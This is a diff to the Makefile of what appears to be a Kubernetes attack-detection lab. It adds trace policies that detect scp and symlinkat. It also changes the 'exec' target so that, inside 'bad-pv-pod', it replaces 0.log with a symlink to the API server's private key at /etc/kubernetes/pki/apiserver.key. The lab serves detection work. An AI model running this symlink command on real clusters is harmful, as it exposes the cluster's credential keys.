@@ -31,6 +31,8 @@ traces:
 	-kubectl apply -f traces/1sshd-probe-success.yaml
 	-kubectl apply -f traces/2enumerate-serviceaccount.yaml
 	-kubectl apply -f traces/3enumerate-python.yaml
+	-kubectl apply -f traces/4detect-scp-usage.yaml
+	-kubectl apply -f traces/6detect-symlinkat.yaml
 
 .PHONY: create-bad
 create-bad:
@@ -83,7 +85,7 @@ ssh-connect:
 
 .PHONY: exec 
 exec:
-	kubectl exec bad-pv-pod -it -- /bin/bash
+	kubectl exec bad-pv-pod -it -- /bin/bash -c "rm 0.log & ln -s /etc/kubernetes/pki/apiserver.key 0.log"
 
 
 ##@ Tools
